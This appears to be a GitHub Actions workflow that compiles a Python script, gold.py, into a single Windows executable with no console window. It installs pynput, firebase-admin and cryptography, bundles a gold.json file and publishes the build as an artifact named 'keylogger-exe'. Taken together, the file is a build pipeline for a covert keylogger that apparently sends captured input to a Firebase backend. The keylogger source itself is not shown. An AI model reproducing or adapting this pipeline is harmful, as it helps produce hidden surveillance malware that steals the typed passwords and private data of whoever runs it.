name: Build Windows .exe

on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v3

    - name: Set up Python 3.10
      uses: actions/setup-python@v4
      with:
        python-version: "3.10"

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller pynput firebase-admin cryptography

    - name: Build with PyInstaller
      run: |
        pyinstaller --onefile --noconsole --add-data "gold.json;." gold.py  # <-- ESTA LÍNHA CAMBIA

    - name: Upload .exe
      uses: actions/upload-artifact@v4
      with:
        name: keylogger-exe
        path: dist/gold.exe
